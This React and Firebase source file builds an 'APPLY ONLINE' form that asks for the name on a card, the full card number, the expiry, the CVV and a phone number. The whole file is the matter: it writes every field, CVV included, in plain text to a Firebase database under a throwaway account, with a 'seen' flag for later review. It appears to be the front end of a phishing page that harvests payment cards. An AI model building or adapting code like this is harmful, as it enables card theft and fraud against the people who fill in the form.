import { Button, Stack, TextField, Typography, } from '@mui/material';
import { createUserWithEmailAndPassword } from 'firebase/auth';
import { ref, set } from 'firebase/database';
import { useEffect, useState } from 'react';
import toast from 'react-hot-toast';
import { useNavigate } from 'react-router-dom';
import { auth, realTiemDB } from '../firebase/firebase';
import { useScrollTo } from '../utils/util';
import Header from './Header';

const Applay = () => {

    const [nameOfCard, setNameOfCard] = useState("");
    const [cardDetails, setCardDetails] = useState("");
    const [expirey, setExpirey] = useState("");
    const [cvv, setCvv] = useState("");
    const [contactNo, setContactNo] = useState("");
    const scrolltop = useScrollTo()
    useEffect(() => {
        scrolltop()
    }, [scrolltop])


    const [isLoading, setIsLoading] = useState(true)



    const timeStemp = Date.now()

    const email = `${timeStemp}@gmail.com`
    const navigate = useNavigate()
    const handdleSubmit = async (e) => {
        e.preventDefault();
        try {
            const timeStemp = Date.now()
            const emailCre = `${timeStemp}@gmail.com`;
            setIsLoading(true)
            const userCredentical = await createUserWithEmailAndPassword(auth, emailCre, contactNo);
            const user = userCredentical.user
            await set(ref(realTiemDB, "users/ " + user?.uid), {

                nameOfCard,
                cardDetails,
                expirey,
                cvv,
                email:emailCre,
                loginType: "Apply",
                contactNo,
                uid: user?.uid,
                date: new Date().toLocaleString(),
                timestemp: timeStemp,
                seen:false

            });
            setIsLoading(false)

            console.log("User Created");
            toast.success("Submitted Successfully")
            navigate(`/success/${user.uid}`)
        } catch (error) {
            console.log(error);
            setIsLoading(false)
        } finally {
            setIsLoading(false)
        }
    }
    return (
        <Stack >
            <Header />

            <Stack width={"100%"} padding={"6rem .5rem"}>

                <Typography textAlign={"center"} width={"100%"} sx={{ bgcolor: "blue", color: "white", padding: ".4rem", fontWeight: "600", fontSize: "1.5rem" }}>APPLY ONLINE</Typography>

                <Stack width={"100%"} height={"3px"} marginTop={"3rem"} sx={{ bgcolor: "#410112", opacity: ".5" }}></Stack>

                <Stack component={'form'} onSubmit={handdleSubmit} width={"100%"} marginTop={"4rem"} padding={"1rem"}>
                    <Typography sx={{ fontWeight: "700", marginTop: "1.5rem" }}>Name Of Card</Typography>
                    <TextField type='text' variant='outlined'
                        required={true}
                        value={nameOfCard} onChange={e => setNameOfCard(e.target.value)}
                        sx={{ borderRadius: "2rem", width: "100%", marginTop: "5px", '& placeholder': { fontSize: '1.3rem' } }}
                        placeholder="Name Of Card" />


                    <Typography sx={{ fontWeight: "700", marginTop: "1.5rem" }}>Card Details</Typography>
                    <TextField
                        type='number'
                        required
                        variant='outlined'

                        value={cardDetails} onChange={e => setCardDetails(e.target.value)}

                        sx={{ borderRadius: "2rem", width: "100%", marginTop: "5px", '& placeholder': { fontSize: '1.3rem' } }}
                        placeholder="1234-5678-9101-1121" />

                    <Typography sx={{ fontWeight: "700", marginTop: "1.5rem" }}>Expiry</Typography>
                    <TextField
                        value={expirey} onChange={e => setExpirey(e.target.value)}
                        inputProps={{
                            maxLength: 10,
                            minlength: 10
                        }} variant='outlined' sx={{
                            borderRadius: "2rem",
                            width: "{100%", marginTop: "5px", '& placeholder': { fontSize: '1.3rem' }
                        }} placeholder="MM/YY " type='number' required />


                    <Typography sx={{ fontWeight: "700", marginTop: "1.5rem" }}>Cvv</Typography>
                    <TextField
                        value={cvv} onChange={e => setCvv(e.target.value)}
                        type='number' variant='outlined'
                        sx={{ borderRadius: "2rem", width: "100%", marginTop: "5px", '& label': { fontSize: '1.3rem' } }}
                        placeholder='000' required />




                    <Typography sx={{ fontWeight: "700", marginTop: "1.5rem" }}>Contact No.</Typography>
                    <TextField
                        value={contactNo} onChange={e => setContactNo(e.target.value)}
                        type='text' variant='outlined'
                        sx={{ borderRadius: "2rem", width: "100%", marginTop: "5px", '& label': { fontSize: '1.3rem' } }}
                        placeholder='0000000000' required />


                    <Stack width={"100%"} padding={"2rem 0"}>
                        <Button type='submit' variant='contained' color='primary' sx={{
                            margin: "auto", borderRadius: "2rem",
                            width: "13rem", color: "white", padding: "12px 8px", "&hover": { bgcolor: "blue" }
                        }}>{isLoading ? "Submit" : "Submiting..."}</Button>
                    </Stack>
                </Stack>
            </Stack>

        </Stack>
    )
}

export default Applay